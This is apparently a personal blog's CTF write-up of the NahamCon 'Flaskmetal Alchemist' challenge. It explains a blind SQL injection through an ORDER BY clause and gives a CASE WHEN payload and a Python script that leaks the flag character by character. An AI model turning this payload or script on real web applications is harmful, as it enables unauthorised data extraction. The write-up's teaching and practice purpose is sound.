
---
title: NahamCon CTF 2022 - Blind SQLi
# Summary for listings and search engines
summary: Medium Web Challenge Writeup 
# Link this post with a project
# projects: []

# Date published
date: "2020-05-13T00:00:00Z"

# Date updated
#lastmod: "2020-12-13T00:00:00Z"

# Is this an unpublished draft?
#draft: false

# Show this page in the Featured widget?
featured: false

# Featured image
# Place an image named `featured.jpg/png` in this page's folder and customize its options here.
 
 
 # placement: 2
  #preview_only: false

authors:
- Wassila Chtioui

tags:
- Blind SQLi
- Web Exploitation
- CTF Write-up
- Flaskmetal Alchemist

categories:
- Web
- CTF
- SQLi
---


### Introduction 
After spending the last month learning about each vulnerability and practising through labs. I had the oppportunity to evalute what I've leant so far through **_NahamCon CTF_** along with that my team **_Arr3stY0u_**.

I mostly enjoyed a Blind SQL Injection task so I thought why not sharing a writeup. 

### Flaskmetal Alchemist - 168 points  - 260 Solves (medium)

![alt text](https://i.imgur.com/PfXdjUZ.png)

The website contained a search bar having a Sort By drop-down list with 3 options: Name, Symbol and Atomic Number. **SQL Injection.. is it you ?**

I took a look at the source code provided. 

![alt text](https://i.imgur.com/f2s7lit.png)

Here, the most interesting line is :

``` 
metals = Metal.query.filter(
                Metal.name.like("%{}%".format(search))
            ).order_by(text(order))
``` 

After some google research, we can understand through the previous line of code that the injection point is the ORDER_BY CLAUSE since it takes the result of the text() function - _which allows us to excecute SQL statements_ - as argument.  
Using burpsuite, it is possible to intercept the request and change the post parameters. 

First, let's check our methodology.
Knowing that we control the ORDER_BY CLAUSE, we can trigger any SQL Statement we want to be executed. 
To verify this, I used the following payload:

``` 
search=Li&order=(SELECT (CASE WHEN (1=1) THEN atomic_number else name END)); 
```

##### PS: I tried using the IF statement but it didn't work since it is only executed in the beggining of a query. Fortunately, "CASE" has the same function.

* **When true: the table is ordered by Atomic Number ==>** 

![alt text](https://i.imgur.com/sRAz5ba.png)

* **When false: the table is ordered by Name ==>**

![alt text](https://i.imgur.com/rg79P2L.png)

At this level, we made sure that according to the order of the elements, we can figure out if the condition we set in the CASE Statement is True or False. 
This comes to say that, in order to exfiltrate the flag, we can compare each character based on the True/False method.
To do so, we used the SUBSTR() function to parse the string character by character. We were also given in the source code the table and the column name where we can find the flag. 

Therefore, in order to automate this, I wrote the following script:
```
import requests, time

s = requests.Session()
dictionary = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z','_','{','}']
URL = "http://challenge.nahamcon.com:31148/"
final = ""
for i in range(1,30):
        for x in dictionary:
                exploit = "(SELECT (CASE WHEN (SUBSTR((SELECT flag FROM flag)," + str(i) + ",1) = '" + x + "')THEN atomic_number else name END));"
                #print exploit
                data = {'search' : 'Li' , 'order' : exploit }
                r = s.post(url = URL , data = data)
                #print(r.text)
                #print(r.text.index("Li"))
                if r.text.index("Li") == 2657 :
                        final = final + x
                        print "Leaking contents: " + final
                        break

```

And now we go eat something while our script is running ! 

![alt text](https://i.imgur.com/UvP81lP.png)

Aaand VOILAA ! 

### Conclusion
To sum up, this task sharpened my scripting skills; I also had the opportunity to dive in more into SQL Injection types. I congratulate the author and I look forward to the next edition.
